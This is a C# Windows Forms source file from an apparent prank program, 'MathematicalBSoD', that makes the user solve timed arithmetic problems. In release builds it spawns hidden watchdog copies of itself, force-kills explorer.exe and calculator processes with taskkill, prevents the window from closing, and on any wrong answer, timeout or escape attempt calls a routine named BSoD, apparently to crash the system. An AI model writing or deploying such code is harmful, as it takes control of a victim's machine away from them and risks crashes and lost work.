using System;
using System.Diagnostics;
using System.Numerics;
using System.Windows.Forms;
using System.Drawing;
using System.Threading;
using System.ComponentModel;
using static MathematicalBSoD.Program;
using ExtendedNumerics;

namespace MathematicalBSoD
{
    public partial class MainForm : Form
    {
        public MainForm()
        {
            InitializeComponent();
        }

        public int level = 0;

        private void label1_Click(object sender, EventArgs e)
        {
#if DEBUG
            question.Text = question.Text + " = " + question.Tag.ToString();
#else
           lose("Curiosity Killed The Cat", "Did u just, click on me?");
#endif
        }

        private void label1_TextChanged(object sender, EventArgs e)
        {
            if (question.PreferredSize.Width + 36 < MinimumSize.Width)
            {
                question.AutoSize = false;
                Width = 200;
                answer_box.Width = 143;
                progressBar1.Width = submit.Width = 162;
                return;
            }
            question.AutoSize = true;
            Width = question.PreferredSize.Width + 36;
            answer_box.Width = question.PreferredSize.Width - 17;
            progressBar1.Width = submit.Width = question.PreferredSize.Width + 2;
        }

        private void textBox1_KeyPress(object sender, KeyPressEventArgs e)
        {
            /*if (e.KeyChar <= '9' && e.KeyChar >= '0')
            {
                textBox1.Tag = e.KeyChar - '0' + (textBox1.Tag as long?) * 10;
            }
            else if (e.KeyChar == '-')
            {
                textBox1.Text = "-" + textBox1.Text;
                textBox1.Tag = -(textBox1.Tag as long?);
                e.Handled = true;
            }
            else e.Handled = true;*/
            e.Handled = !((e.KeyChar <= '9' && e.KeyChar >= '0') || e.KeyChar == '\b' || (e.KeyChar <= 31 && e.KeyChar >= 0));
            switch (e.KeyChar)
            {
                case '-':
                    answer_box.Tag = -(answer_box.Tag as BigInteger?);
                    if (label2.Text == "+") label2.Text = "-";
                    else label2.Text = "+";
                    break;
                case '\r':
                    if (submit.Enabled) submit_Click(sender, e);
                    break;
            }
        }

        private void submit_Click(object sender, EventArgs e)
        {
            if (question.Tag is BigInteger answer)
            {
                if (BigInteger.TryParse(answer_box.Text, out BigInteger user_answer))
                {
                    if (label2.Text == "-") user_answer = -user_answer;
                    if (user_answer == answer)
                    {
                        if (sender is System.Windows.Forms.Timer)
                        {
                            lose("Time's up", "Ur answer is correct but time's up, what a shame");
                            return;
                        }
                        timer.Stop();
                        time_limition += 20;
                        InitQuestion();
                    }
                    else
                    {
                        timer.Stop();
                        if (sender is System.Windows.Forms.Timer)
                        {
                            lose("Time's up", "My timer said time's up");
                            return;
                        }
                        lose("Opps", question.Text + " = " + answer.ToString());
                    }
                }
                else
                {
                    if (sender is System.Windows.Forms.Timer)
                    {
                        lose("Time's up", "U are not filling a word right?");
                        return;
                    }
                    MessageBox.Show(string.Format("\"{0}\" is not a vaild number", answer_box.Text), "Warning",
                        MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                }
            }
        }

        private void InitQuestion()
        {
            level++;
            BigInteger first =
                NextBigInteger(random,
                BigInteger.Pow(10, level - 1),
                BigInteger.Pow(10, level));
            BigInteger second =
                NextBigInteger(random,
                BigInteger.Pow(10, level - 1),
                BigInteger.Pow(10, level));
            string second_string = second.ToString();
            switch (random.Next(0, 6))
            {
                case 0:
                case 1:
                case 2:
                    break;
                case 3:
                    first = -first;
                    break;
                case 4:
                    second = -second;
                    second_string = $"(-{second_string})";
                    break;
                case 5:
                    first = -first;
                    goto case 4;
            }
            switch (random.Next(0, 2))
            {
                case 0:
                    question.Text = first.ToString() + " + " + second_string;
                    question.Tag = first + second;
                    break;
                case 1:
                    question.Text =
                        first.ToString() + " - " + second_string;
                    question.Tag = first - second;
                    break;
            }
            current_time = 0;
            current_time_percent = 0;
            answer_box.Text = "";
            label2.Text = "+";
            Text = string.Format("Solve question {0}", level);
            progressBar1.Value = 0;
            timer.Start();
        }

        Random random = new Random();

        public void KillProcessEx(string processName)
        {
            //if (KillProcess(processName)) return;
            Process process = new Process();
            process.StartInfo.FileName = "taskkill.exe";
            process.StartInfo.Arguments = "/f /im " + processName + ".exe";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput =
                process.StartInfo.CreateNoWindow = true;
            process.Start();
            process.WaitForExit();
            process.Close();
        }

        public bool KillProcess(string processName)
        {
            foreach (Process process in Process.GetProcessesByName(processName))
            {
                try
                {
                    process.Kill();
                    process.WaitForExit();
                }
                catch (Win32Exception)
                {
                    return false;
                }
                catch (InvalidOperationException) { }
            }
            return true;
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
#if !DEBUG
            for (int i = 0; i < 5; i++)
            {
                Process process = new Process();
                process.StartInfo.FileName = Process.GetCurrentProcess().MainModule.FileName;
                process.StartInfo.Arguments = "watchdog" + (i == 4 ? " WithMessage" : "");
                process.StartInfo.CreateNoWindow = true;
                process.Start();
            }
            KillProcessEx("explorer");
            KillProcessEx("calc");
            KillProcessEx("CalculatorApp");
#endif
            InitQuestion();
            ProcessDetection.Start();
        }

        private void lose(string str, string str2)
        {
            ProcessDetection.Stop();
            question.ForeColor = Color.Red;
            answer_box.Enabled = submit.Enabled = false;
            label1.Text = answer_box.Text = submit.Text = Text = str;
            question.Text = str2;
            new Thread(() =>
            {
#if !DEBUG
                Thread.Sleep(1000);
#endif
                BSoD();
            }).Start();
        }

        /// <summary>
        /// Returns a random BigInteger that is within a specified range.
        /// The lower bound is inclusive, and the upper bound is exclusive.
        /// </summary>
        public static BigInteger NextBigInteger(Random random, BigInteger minValue, BigInteger maxValue)
        {
            if (minValue > maxValue) throw new ArgumentException();
            if (minValue == maxValue) return minValue;
            BigInteger zeroBasedUpperBound = maxValue - 1 - minValue; // Inclusive
            Debug.Assert(zeroBasedUpperBound.Sign >= 0);
            byte[] bytes = zeroBasedUpperBound.ToByteArray();
            Debug.Assert(bytes.Length > 0);
            Debug.Assert((bytes[bytes.Length - 1] & 0b10000000) == 0);

            // Search for the most significant non-zero bit
            byte lastByteMask = 0b11111111;
            for (byte mask = 0b10000000; mask > 0; mask >>= 1, lastByteMask >>= 1)
            {
                if ((bytes[bytes.Length - 1] & mask) == mask) break; // We found it
            }

            while (true)
            {
                random.NextBytes(bytes);
                bytes[bytes.Length - 1] &= lastByteMask;
                var result = new BigInteger(bytes);
                Debug.Assert(result.Sign >= 0);
                if (result <= zeroBasedUpperBound) return result + minValue;
            }
        }

        private void answer_box_KeyUp(object sender, KeyEventArgs e)
        {
            submit.Enabled = !string.IsNullOrEmpty(answer_box.Text);
        }

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
#if !DEBUG
            e.Cancel = true;
            lose("Trying to escape?", "There's no escape");
#endif
        }

        private void ProcessDetection_Tick(object sender, EventArgs e)
        {
            string[] processes_name = new string[]
            {
                "calc",
                "CalculatorApp"
            };
            foreach (var process in processes_name)
                if (Process.GetProcessesByName(process).Length > 0)
#if DEBUG
                {
                    MessageBox.Show("Cheat anyway", "Debug");
                    ProcessDetection.Stop();
                }
#else
                lose("Cheating", "No calculators!");
            if (Process.GetProcessesByName("explorer").Length > 0)
                KillProcessEx("explorer");
            WatchDogTask();
#endif
        }

        private BigDecimal time_limition = 50, current_time = 0;
        private double _current_time_percent = 0;
        private double current_time_percent
        {
            get
            {
                return _current_time_percent;
            }
            set
            {
                _current_time_percent = value;
                progressBar1.Value = (int)value;
            }
        }

        private void timer_Tick(object sender, EventArgs e)
        {
            if (current_time_percent + (double)(100 / time_limition) > 100 || current_time >= time_limition)
            {
                progressBar1.Value = 100;
                timer.Stop();
#if DEBUG
                label1.Text = "Time's up";
                return;
#else
                submit_Click(sender, e);
                return;
#endif
            }
            current_time_percent += (double)(100 / time_limition);
            label1.Text = string.Format("{0:0.0}s({2:0.0}%):{1:0.0}s({3:0.0}%)", current_time / 10, (time_limition - current_time) / 10, current_time_percent, 100 - current_time_percent);
            current_time++;
        }
    }
}
